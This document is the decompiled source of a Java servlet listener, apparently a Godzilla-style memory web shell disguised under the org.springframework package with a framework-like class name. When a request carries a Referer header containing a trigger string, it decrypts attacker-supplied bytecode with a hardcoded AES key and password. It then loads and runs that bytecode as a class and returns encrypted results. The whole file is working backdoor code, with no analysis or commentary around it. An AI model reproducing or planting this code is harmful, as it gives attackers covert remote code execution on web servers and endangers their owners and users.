package org.springframework;

import java.io.ByteArrayOutputStream;
import java.lang.reflect.Field;
import java.math.BigInteger;
import java.security.MessageDigest;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

/* loaded from: output.class */
public class ServletContextAttributeJijnceListener extends ClassLoader implements ServletRequestListener {
    public String headerName;
    public String headerValue;
    static String pass = "Zcjqteqf";
    static String key = "154baef29abb78f3";
    static String md5 = md5(pass + key);

    /* renamed from: cs */
    public static String f0cs = "UTF-8";

    private HttpServletResponse getResponseFromRequest(HttpServletRequest httpServletRequest) throws Exception {
        HttpServletResponse httpServletResponse = null;
        try {
            httpServletResponse = (HttpServletResponse) getFV(getFV(httpServletRequest, "request"), "response");
        } catch (Exception e) {
            try {
                httpServletResponse = (HttpServletResponse) getFV(httpServletRequest, "response");
            } catch (Exception e2) {
            }
        }
        return httpServletResponse;
    }

    public ServletContextAttributeJijnceListener() {
        this.headerName = "Referer";
        this.headerValue = "Ntilses";
    }

    public ServletContextAttributeJijnceListener(ClassLoader z) {
        super(z);
        this.headerName = "Referer";
        this.headerValue = "Ntilses";
        md5 = md5(pass + key);
        f0cs = "UTF-8";
    }

    /* renamed from: Q */
    public Class m1Q(byte[] cb) {
        return super.defineClass(cb, 0, cb.length);
    }

    /* renamed from: x */
    public byte[] m0x(byte[] s, boolean m) {
        try {
            Cipher c = Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception e) {
            return null;
        }
    }

    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
    }

    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        HttpServletRequest request = (HttpServletRequest) servletRequestEvent.getServletRequest();
        try {
            if (request.getHeader(this.headerName) != null && request.getHeader(this.headerName).contains(this.headerValue)) {
                HttpServletResponse response = getResponseFromRequest(request);
                HttpSession session = request.getSession();
                byte[] data = m0x(base64Decode(request.getParameter(pass)), false);
                if (session.getAttribute("payload") == null) {
                    session.setAttribute("payload", new ServletContextAttributeJijnceListener(getClass().getClassLoader()).m1Q(data));
                } else {
                    request.setAttribute("parameters", data);
                    ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                    Object f = ((Class) session.getAttribute("payload")).newInstance();
                    f.equals(arrOut);
                    f.equals(request);
                    response.getWriter().write(md5.substring(0, 16));
                    f.toString();
                    response.getWriter().write(base64Encode(m0x(arrOut.toByteArray(), true)));
                    response.getWriter().write(md5.substring(16));
                    response.flushBuffer();
                }
            }
        } catch (Exception e) {
        }
    }

    private static synchronized Object getFV(Object var0, String var1) throws Exception {
        Field var2 = null;
        Class cls = var0.getClass();
        while (true) {
            Class var3 = cls;
            if (var3 == Object.class) {
                break;
            }
            try {
                var2 = var3.getDeclaredField(var1);
                break;
            } catch (NoSuchFieldException e) {
                cls = var3.getSuperclass();
            }
        }
        if (var2 == null) {
            throw new NoSuchFieldException(var1);
        }
        var2.setAccessible(true);
        return var2.get(var0);
    }

    public static String md5(String s) {
        String ret = null;
        try {
            MessageDigest m = MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = new BigInteger(1, m.digest()).toString(16).toUpperCase();
        } catch (Exception e) {
        }
        return ret;
    }

    public static String base64Encode(byte[] bs) throws Exception {
        String value = null;
        try {
            Class base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
            value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, bs);
        } catch (Exception e) {
            try {
                Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
                value = (String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, bs);
            } catch (Exception e2) {
            }
        }
        return value;
    }

    public static byte[] base64Decode(String bs) {
        byte[] value = null;
        try {
            Class base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception e) {
            try {
                Object decoder2 = Class.forName("sun.misc.BASE64Decoder").newInstance();
                value = (byte[]) decoder2.getClass().getMethod("decodeBuffer", String.class).invoke(decoder2, bs);
            } catch (Exception e2) {
            }
        }
        return value;
    }
}